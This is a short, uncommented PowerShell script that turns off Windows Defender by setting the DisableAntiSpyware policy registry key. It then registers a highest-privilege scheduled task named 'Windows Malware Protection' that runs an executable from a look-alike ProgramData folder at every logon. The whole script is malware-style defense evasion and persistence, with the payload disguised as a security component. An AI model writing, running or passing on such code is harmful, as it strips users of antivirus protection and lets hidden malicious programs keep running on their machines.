$registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$Name = "DisableAntiSpyware"
$value = "1"
New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType DWORD -Force | Out-Null
$trigger = New-JobTrigger -AtLogon
$action = New-ScheduledTaskAction -Execute 'C:\ProgramData\Windows Malware Protection\legitprogram.exe'
Register-ScheduledTask -Action $action -Trigger $trigger -RunLevel Highest -TaskName "Windows Malware Protection"